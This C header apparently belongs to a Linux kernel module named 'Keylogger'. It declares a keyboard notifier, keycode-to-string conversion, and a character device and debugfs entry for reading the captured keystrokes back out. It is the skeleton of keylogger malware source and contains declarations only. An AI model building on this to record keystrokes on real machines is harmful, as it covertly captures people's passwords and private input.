#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_
#include "./fops.h"
#include <linux/fs.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/kernfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/mutex.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include <linux/sysfs.h>
#include "./keys.h"
//#include "./module.h"
#define DEVICE_NAME "Keylogger"
#define BUFF_SIZE (PAGE_SIZE << 2)
static char msg_Ptr[BUFF_SIZE];
static size_t buf_pos;
struct fake_device virtual_device;
static struct dentry* subdir;
dev_t dev_num;
int major_number;
struct cdev* mcdev;
/*vars for makeing files*/
/*########*/
//int ret ;
//int len;

/*Vars for keystroke & strings save*/
int device_open(struct inode *inode, struct file * filp);
ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset);
int device_close(struct inode *inode, struct file *flip);
static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset);

int keycode_to_string(int key_press, int shift, char* buff);
int notifier(struct notifier_block* block, unsigned long code, void* p);
static struct notifier_block keylogger = { .notifier_call = notifier };
int run_keylogger(void);
void stop_keylogger(void);

#endif